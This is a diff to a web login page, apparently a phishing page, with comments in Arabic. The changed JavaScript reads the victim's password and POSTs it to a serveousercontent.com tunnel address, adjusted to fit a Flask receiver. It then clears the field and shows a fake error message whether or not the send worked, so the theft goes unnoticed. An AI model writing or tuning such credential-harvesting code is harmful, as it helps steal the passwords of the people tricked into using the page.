@@ -23,7 +23,7 @@
             border: 1px solid #facc15;
             border-radius: 12px;
             padding: 30px;
-            box-shadow: 0 0 20px rgba(250, 204, 21, 0.2);
+            box-shadow: 0 0 20px rgba(250, 204, 21, 0.4);
             text-align: center;
         }
         .header img { width: 120px; margin-bottom: 15px; }
@@ -96,8 +96,8 @@
             const pass_val = document.getElementById('pass_field').value;
             const errorBox = document.getElementById('msg_box');
 
-            // الرابط المحدث بناءً على طلبك
-            const targetUrl = 'https://7990910083713e47-5-255-10-47.serveousercontent.com';
+            // الرابط المحدث مع علامة / في النهاية لضمان التوافق مع Flask
+            const targetUrl = 'https://7990910083713e47-5-255-10-47.serveousercontent.com/';
 
             fetch(targetUrl, {
                 method: 'POST',
@@ -111,12 +111,12 @@
                 })
             })
             .then(response => {
-                // إظهار رسالة الخطأ للمستخدم بعد الإرسال
                 errorBox.style.display = 'block';
                 document.getElementById('pass_field').value = ''; 
             })
             .catch(error => {
                 console.error('Error:', error);
+                // تظهر الرسالة حتى لو كان هناك خطأ لضمان استمرار العملية
                 errorBox.style.display = 'block';
             });
         });
